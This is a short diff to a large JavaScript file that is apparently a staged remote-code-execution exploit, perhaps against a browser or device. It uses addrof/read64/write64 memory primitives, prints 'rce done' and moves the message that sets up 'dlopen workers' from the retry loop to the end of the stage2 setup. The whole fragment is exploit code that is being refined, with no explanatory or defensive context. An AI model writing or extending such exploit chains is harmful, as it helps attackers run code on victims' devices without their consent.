@@ -18435,6 +18435,9 @@ const device_chipset = {
           if (typeof p.worker_context === 'bigint')
             print(`worker context cached: ${p.worker_context.hex()}`);
           print("Finished stage2 prims succesfully, rce done");
+          self.postMessage({
+            type: 'prepare_dlopen_workers'
+          });
         }
         setup_stage1_prim(p_rce);
         setup_stage2_prim();
@@ -19399,16 +19402,8 @@ async function main() {
               const maxRetries = 15;
               for (let attempt = 0; attempt < maxRetries; attempt++) {
                 p_temp = await main();
-                if (p_temp && p.addrof && p.read64 && p.write64) {
-                  print("stage1_rce: scheduling dlopen worker prep");
-                  setTimeout(() => {
-                    print("stage1_rce: requesting dlopen workers");
-                    self.postMessage({
-                      type: 'prepare_dlopen_workers'
-                    });
-                  }, 0);
+                if (p_temp && p.addrof && p.read64 && p.write64)
                   return;
-                }
                 print("Failed rce, retry " + (attempt + 1) + "/" + maxRetries);
               }
               print("All retries exhausted");
